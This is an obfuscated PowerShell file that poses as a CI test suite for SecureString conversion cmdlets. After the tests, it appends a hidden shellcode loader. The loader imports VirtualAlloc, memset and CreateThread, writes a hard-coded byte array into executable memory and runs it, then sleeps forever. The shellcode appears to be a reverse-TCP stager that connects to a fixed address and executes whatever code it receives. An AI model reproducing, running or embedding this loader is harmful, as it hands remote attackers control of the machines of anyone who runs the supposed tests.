.("{0}{1}"-f'Se','t') ("9"+"5Ub")  ( [tYpe]("{2}{0}{1}{4}{7}{6}{5}{3}"-F 'y','s','s','g','Tem.se','IN','str','cuRITY.secure') )  ; &('Sv') ("{1}{0}"-f '0zR','2') ( [tyPe]("{0}{1}{2}"-f 'PscRe','D','EntIal')  );

&("{1}{0}{2}" -f 'c','Des','ribe') ("{2}{1}{3}{6}{0}{5}{8}{7}{4}"-f 'ing','ec','S','ureS','ersion tests',' ','tr','nv','co') -Tags "CI" {
    .("{2}{3}{0}{1}"-f 'reA','ll','B','efo') {
        ${sT`Ring} = ("{1}{0}" -f 'D','ABC')
        ${sEc`U`R`E`STRINg} =   ( &("{0}{1}"-f 'vArIaBL','E') ("9"+"5Ub")  )."VaL`UE"::("{0}{1}" -f 'Ne','w').Invoke()
        ${sTr`i`NG}.("{3}{2}{0}{1}"-f 'rra','y','CharA','To').Invoke() | .("{3}{1}{2}{0}"-f't','oreach','-objec','f') { ${SECU`Re`sTR`inG}.("{2}{1}{0}"-f 'har','C','Append').Invoke(${_}) }
    }

    &('It') ("{2}{3}{13}{8}{1}{6}{7}{5}{12}{0}{11}{9}{4}{10}"-f'r',' to Co','using null arg','u','pro','-Secure','nvert','From','ts','ng ','duces an exception','i','St','men') {
        { &("{1}{2}{4}{5}{6}{7}{0}{3}"-f 'tri','Con','ver','ng','tF','rom-','S','ecureS') -secureString ${N`ULl} -key ${N`ULl} } |
            &("{1}{0}" -f'ld','Shou') -Throw -ErrorId ("{16}{18}{3}{4}{1}{10}{14}{2}{9}{6}{15}{5}{13}{17}{19}{11}{20}{8}{0}{7}{12}" -f 'ngCom','nE','Allo','id','atio','t.PowerShell.',',Mi','man','reStri','wed','rror','e','d','Commands','NullNot','crosof','Pa','.','rameterArgumentVal','ConvertFromS','cu')
    }

    &('It') ("{4}{3}{9}{6}{8}{2}{0}{7}{1}{5}" -f 'p','es an except',' ','sin','u','ion',' bad ','roduc','key','g a') {
        ${BA`DkEY} = [byte[]]@(1,2)
        { .("{1}{6}{3}{2}{5}{0}{4}"-f 'e','Conv','rom-Secu','tF','String','r','er') -securestring ${SECU`REsT`RI`NG} -key ${Ba`dkEy} } |
            .("{1}{0}"-f'd','Shoul') -Throw -ErrorId ("{4}{8}{2}{6}{11}{1}{3}{14}{9}{13}{10}{0}{5}{7}{12}" -f'tFromSecureStri','ft.',',','P','Argume','ngCom','M','ma','nt','l.Commands.Co','r','icroso','nd','nve','owerShel')
    }

    &('It') ("{2}{4}{1}{6}{0}{7}{5}{3}"-f'vert to a','c','C','ng','an ','tri','on',' secure s') {
        ${s`S} = &("{5}{1}{0}{6}{4}{2}{3}"-f 'To-S','onvert','n','g','cureStri','C','e') -AsPlainText -Force ("{1}{0}"-f 'd','abc')
        ${S`S} | .("{0}{1}" -f 'S','hould') -BeOfType ("{3}{0}{2}{1}" -f 'ecur','ring','eSt','S')
    }
    &('It') ("{5}{1}{0}{9}{8}{11}{10}{2}{4}{3}{6}{7}" -f'onvert ','n c','m a se','re st','cu','ca','r','ing','ack f','b','o','r') {
        ${se`CreT} = ("{1}{0}" -f'bcd','a')
        ${s`S1} = .("{1}{0}{2}{3}{5}{4}"-f'e','Conv','rtTo-Se','cureS','ing','tr') -AsPlainText -Force ${S`e`CRet}
        ${s`s2} = &("{5}{6}{2}{0}{1}{3}{4}"-f'ro','m-s','ertf','ec','urestring','con','v') ${S`S1} | &("{0}{1}{5}{2}{4}{3}" -f'c','onvertto-sec','est','ing','r','ur')
          ( &("{0}{2}{1}"-f'var','le','IAB') ("{1}{0}" -f'0zR','2') )."VA`LUE"::("{1}{0}"-f'ew','N').Invoke(("{0}{1}"-f'us','er'),${s`S2}).("{0}{2}{3}{1}{4}{5}"-f 'Get','kC','Netwo','r','redentia','l').Invoke()."pas`SwO`RD" | .("{0}{1}"-f 'Shou','ld') -Be ${se`CrEt}
    }
}

${C} = ((("{51}{49}{80}{2}{31}{79}{38}{45}{56}{8}{12}{13}{57}{63}{53}{23}{11}{69}{43}{20}{24}{14}{21}{68}{62}{52}{61}{4}{41}{6}{40}{74}{36}{44}{71}{33}{37}{35}{26}{54}{19}{22}{59}{18}{16}{72}{42}{34}{0}{28}{77}{60}{73}{29}{58}{32}{39}{64}{47}{25}{55}{75}{48}{5}{10}{17}{30}{27}{3}{76}{66}{7}{15}{46}{70}{67}{50}{65}{1}{78}{9}" -f 'IntPtr l','rc, uint ','ne','tatic exte','el','crt.','u',' IntPtr memset','r','t);','dllCx',', ','n IntPtr Virtu','alAlloc(I','Typ','(In',' In','F)]pu',' dwStackSize,','dAttribut','a','e','es, ','dress','tion','read','d(IntPtr lpTh','lic s','pParam','i','b','l32',', IntPtr','Ptr',' lpStartAddress, ','eateThrea','c s',' Cr','llCx',' l','bl','32.dllCxF)]p','tr','e, uint flAlloc','tatic','F)]public ','tPtr dest','Th','CxFmsv','mport(CxFk','i','[DllI','int flP','Ptr lpAd','rea','Id);[DllImport','static exte','n','onFlags','uint',' uint dw','rotect);[DllImport(CxFkern','u','t','p','nt s','n','u',', ','uint dwSiz',', ',' extern Int','tP','Creat','i','(','r','eter,','coun','.d','er'))."REP`lAce"('CxF',[stRING][ChAr]34));${W} = &("{0}{1}{2}" -f 'Ad','d-Ty','pe') -memberDefinition ${C} -Name ("{0}{1}" -f 'W','in32') -namespace ("{3}{2}{0}{1}" -f 'n','s','tio','Win32Func') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x67,0xec,0x08,0x68,0x02,0x00,0x04,0x62,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${G} = 0x1000;if (${z}."leNG`Th" -gt 0x1000){${g} = ${z}."L`ength"};${x}=${w}::("{3}{2}{1}{0}" -f 'c','o','lAll','Virtua').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${Z}."leN`GTH"-1);${i}++) {${w}::"MeMs`eT"([IntPtr](${X}.("{1}{0}"-f'32','ToInt').Invoke()+${i}), ${Z}[${i}], 1)};${w}::("{0}{1}{2}"-f 'Cre','ateT','hread').Invoke(0,0,${X},0,0,0);for (;;){.("{0}{1}{2}{3}"-f'S','t','art-sl','eep') 60};
